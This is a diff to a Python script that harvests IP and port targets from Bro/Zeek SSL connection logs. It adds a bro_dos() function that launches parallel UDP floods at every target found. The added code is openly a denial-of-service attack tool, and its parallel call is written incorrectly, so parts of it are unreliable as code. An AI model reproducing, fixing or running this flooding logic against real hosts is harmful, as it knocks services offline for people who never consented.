@@ -1,11 +1,9 @@
+from joblib import Parallel, delayed
 from bat import bro_log_reader
 from cfg import SSL_LOG, FLAGS
 
+from Target import Target
 
-class Target:
-    def __init__(self, ip, port):
-        self.ip = ip
-        self.port = port
 
 def find_traffic(log,flags):
     reader = bro_log_reader. BroLogReader(log)
@@ -38,6 +36,15 @@ def make_targets(sorted_traffic, ip_list):
         targets.append(T)
 
     return targets
+
+def bro_dos():
+    conns = find_traffic(SSL_LOG,FLAGS)
+    ips = sort_ips(conns)
+    targets = make_targets(conns, ips)
+
+    for T in targets:
+        func = udp_flood(T.ip, T.port, True)
+        Parallel(n_jobs = 2, prefer = 'threads')(delayed(func))#for i in range(THREADS))
 
 if __name__ == '__main__':
     conns = find_traffic(SSL_LOG,FLAGS)
